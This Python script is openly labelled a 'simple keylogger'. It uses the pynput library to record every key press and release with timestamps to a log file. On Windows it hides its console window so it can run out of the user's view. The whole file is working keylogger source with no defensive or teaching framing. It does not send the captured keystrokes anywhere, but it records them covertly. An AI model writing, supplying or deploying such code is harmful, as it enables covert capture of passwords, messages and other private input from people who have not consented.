import os
import sys
import argparse
import logging
from pynput import keyboard

if os.name == 'nt':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def on_press(key):
    """
    Callback function to handle key press events.
    """
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """
    Callback function to handle key release events.
    """
    logging.info(f"Key released: {key}")
    # Stop listener if escape key is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger(log_file):
    logging.basicConfig(
        filename=log_file,
        level=logging.DEBUG,
        format="%(asctime)s: %(message)s"
    )
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()
        except Exception as e:
            logging.error(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Simple keylogger")
    parser.add_argument("--log-file", required=True, help="Path to the log file")
    args = parser.parse_args()
    start_keylogger(args.log_file)

if __name__ == "__main__":
    main()
